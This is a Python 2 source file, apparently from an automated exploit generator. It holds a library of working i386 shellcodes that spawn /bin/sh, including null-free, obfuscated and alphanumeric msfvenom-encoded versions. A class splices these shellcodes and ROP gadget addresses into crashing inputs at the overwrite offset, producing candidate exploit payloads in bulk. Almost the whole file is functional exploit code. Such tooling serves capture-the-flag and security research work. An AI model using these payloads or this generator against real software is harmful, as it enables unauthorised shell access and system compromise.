from pwn import *
import os
import sys
import pycurl
import StringIO
from urllib import urlencode
import json
from roputils import *
from pwn import *
from resource import setrlimit, RLIMIT_CORE,RLIM_INFINITY

defaultencoding = 'ascii'
if sys.getdefaultencoding() != defaultencoding:
    reload(sys)
    sys.setdefaultencoding(defaultencoding)

shellcode_lib = []
shellcode_lib.append("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
# normal
shellcode_lib.append(asm(shellcraft.i386.sh()))
# normal
shellcode_lib.append("\xc0\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
# suffix \xc0 to avoid the first byte is \x00
shellcode_lib.append("\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68")
# lowconfuse
shellcode_lib.append("\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1")
# encry
shellcode_lib.append("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")
# highconfuse
# msfvenom encoder
shellcode_lib.append("PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA")
# call_eax(alpha_upper)
shellcode_lib.append("IIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA")
# call_ecx(alpha_upper)
shellcode_lib.append("RYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA")
# call_edx(alpha_upper)
shellcode_lib.append("SYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA")
# call_ebx(alpha_upper)
shellcode_lib.append("VYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA")
# call_esi(alpha_upper)
shellcode_lib.append("WYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA")
# call_edi(alpha_upper)

class shell_craft():
    def __init__(self, binary, crash, rop_and_index, info):
        self.binary = binary
        self.crash = crash
        self.info = info
        self.rop_and_index = rop_and_index
        self.payload = []

    def create_payload(self):
        for shellcode in shellcode_lib:
            for rop,index in self.rop_and_index.items():
                if 'direct_call' in rop:
                    #print 'direct_call shellcraft'
                    self.payload.append(self.crash[0:int(index)] + shellcode + self.crash[int(index)+len(shellcode):])
                    self.payload.append(self.crash[0:1] + '\x00' + self.crash[2:int(index)] + shellcode + self.crash[int(index)+len(shellcode):])
                else:
                    reg = rop.split(',')[1]
                    rop = rop.split(',')[0]
                    if reg == 'esp':
                        if len(shellcode) + int(index) <= len(self.crash):
                            self.payload.append(self.crash[0:int(index)-4] + rop + shellcode + self.crash[int(index)+len(shellcode):])
                            self.payload.append(self.crash[0:1] + '\x00' + self.crash[2:int(index)-4] + rop + shellcode + self.crash[int(index)+len(shellcode):])
                        else:
                            self.payload.append(self.crash[0:int(index)-4] + rop + shellcode)
                            self.payload.append(self.crash[0:1] + '\x00' + self.crash[2:int(index)-4] + rop + shellcode)
                    else:
                        i = 0
                        if len(shellcode) + int(index) <= len(self.crash):
                            shellcode_tmp = self.crash[0:int(index)] + shellcode + self.crash[int(index)+len(shellcode):]
                        else:
                            shellcode_tmp = self.crash[0:int(index)] + shellcode
                        while(1):
                            i = shellcode_tmp.find(self.info['eip'], i)
                            if i < 0:
                                break
                            self.payload.append(shellcode_tmp[0:i] + rop + shellcode_tmp[i+4:])
                            self.payload.append(shellcode_tmp[0:1] + '\x00' + shellcode_tmp[2:i] + rop + shellcode_tmp[i+4:])
                            i += 1
        log.info('Total payload: ' + str(len(self.payload)))
        return self.payload


